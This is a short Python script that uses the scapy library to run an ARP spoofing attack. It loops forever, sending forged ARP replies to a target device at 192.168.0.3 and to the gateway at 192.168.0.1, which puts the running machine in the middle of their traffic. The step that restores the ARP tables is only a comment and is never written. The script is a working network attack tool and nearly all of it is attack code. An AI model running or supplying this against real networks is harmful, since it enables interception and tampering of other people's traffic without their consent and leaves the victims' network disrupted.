import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Example usage:
target_ip = "192.168.0.3"  # IP of the target device
spoof_ip = "192.168.0.1"    # IP of the router (gateway)

try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        time.sleep(2)  # Delay between spoofing packets

except KeyboardInterrupt:
    print("\nARP spoofing stopped. Restoring ARP tables...")
    # Reset ARP tables here (not shown in the example)

